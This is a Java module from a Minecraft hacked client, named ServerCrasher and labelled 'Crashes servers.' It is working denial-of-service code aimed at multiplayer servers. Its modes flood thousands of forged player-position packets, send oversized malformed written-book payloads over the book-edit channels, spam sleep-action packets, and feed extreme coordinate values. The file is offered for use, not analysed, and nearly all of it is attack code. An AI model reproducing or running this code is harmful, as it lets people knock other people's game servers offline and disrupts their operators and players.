package me.robbanrobbin.jigsaw.client.modules;

import java.util.HashSet;

import org.lwjgl.input.Keyboard;

import com.google.common.base.Charsets;
import com.google.common.base.Joiner;

import io.netty.buffer.Unpooled;
import me.robbanrobbin.jigsaw.client.events.UpdateEvent;
import me.robbanrobbin.jigsaw.client.main.Jigsaw;
import me.robbanrobbin.jigsaw.client.module.state.Category;
import me.robbanrobbin.jigsaw.module.Module;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C03PacketPlayer;
import net.minecraft.network.play.client.C0BPacketEntityAction;
import net.minecraft.network.play.client.C17PacketCustomPayload;

public class ServerCrasher extends Module {

	boolean switchh = false;

	public ServerCrasher() {
		super("ServerCrasher", Keyboard.KEY_NONE, Category.EXPLOITS, "Crashes servers.");
	}

	@Override
	public void onDisable() {

		super.onDisable();
	}

	@Override
	public void onEnable() {
		super.onEnable();
	}

	@Override
	protected void onModeChanged(String modeBefore, String newMode) {
		super.onModeChanged(modeBefore, newMode);
		this.setToggled(false, true);
	}

	@Override
	public void onUpdate(UpdateEvent event) {
		if (currentMode.equals("FlyEnabled")) {
			if (mc.isSingleplayer()) {
				this.setToggled(false, true);
				return;
			}
			double playerX = mc.thePlayer.posX;
			double playerY = mc.thePlayer.posY;
			double playerZ = mc.thePlayer.posZ;
			double y = 0;
			double x = 0;
			double z = 0;
			for (int i = 0; i < 200;) {
				y = i * 9;
				sendPacketFinal(new C03PacketPlayer.C04PacketPlayerPosition(playerX, playerY + y, playerZ, false));
				i++;
			}
			for (int i = 0; i < 10000;) {
				z = i * 9;
				sendPacketFinal(new C03PacketPlayer.C04PacketPlayerPosition(playerX, playerY + y, playerZ + z, false));
				i++;
			}
			this.setToggled(false, true);
		}
		if (currentMode.equals("MathOverflow")) {
			if (switchh) {
				event.x = Double.MIN_VALUE;
				event.y = mc.thePlayer.posY;
				event.z = Double.MIN_VALUE;
				switchh = false;
			} else {
				event.x = Double.MAX_VALUE;
				event.y = mc.thePlayer.posY;
				event.z = Double.MAX_VALUE;
				switchh = true;
			}

		}
		if (currentMode.equals("ToTheDumpster")) {
			for (int i = 0; i < 100; i++) {
				sendMalformedBook();
			}
		}
		if (currentMode.equals("Vanilla")) {
			for (int i = 0; i < 1500; i++) {
				sendPacketFinal(new C0BPacketEntityAction(mc.thePlayer, C0BPacketEntityAction.Action.STOP_SLEEPING));
			}
		}
		super.onUpdate(event);
	}

	private static HashSet<String> pluginChannels = new HashSet<String>();

	private static String format(Iterable<?> objects, String separators) {
		return Joiner.on(separators).join(objects);
	}

	private void sendMalformedBook() {
		try {
			ItemStack bookObj = new ItemStack(Items.written_book);
			String author = "xDark" + Math.random() * 400.0;
			String title = "LOL KEK " + Math.random() * 400.0;
			String mm255 = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
			NBTTagCompound tag = new NBTTagCompound();
			NBTTagList list = new NBTTagList();
			for (int i = 0; i < 50; ++i) {
				String siteContent = mm255;
				NBTTagString tString = new NBTTagString(siteContent);
				list.appendTag(tString);
			}
			tag.setString("author", author);
			tag.setString("title", title);
			tag.setTag("pages", list);
			if (bookObj.hasTagCompound()) {
				NBTTagCompound nbttagcompound = bookObj.getTagCompound();
				nbttagcompound.setTag("pages", list);
			} else
				bookObj.setTagInfo("pages", list);
			String s2 = "MC|BEdit";
			if (rand.nextBoolean()) {
				s2 = "MC|BSign";
			}
			bookObj.setTagCompound(tag);
			PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
			packetbuffer.writeItemStackToBuffer(bookObj);
			sendPacketFinal(new C17PacketCustomPayload(s2, packetbuffer));
		} catch (Exception exc) {
		}
	}

	@Override
	public void onLoadWorld() {
		super.onLoadWorld();
		this.setToggled(false, true);
	}

	@Override
	public String[] getModes() {
		return new String[] { "ToTheDumpster", "FlyEnabled", "Vanilla" };
	}

}
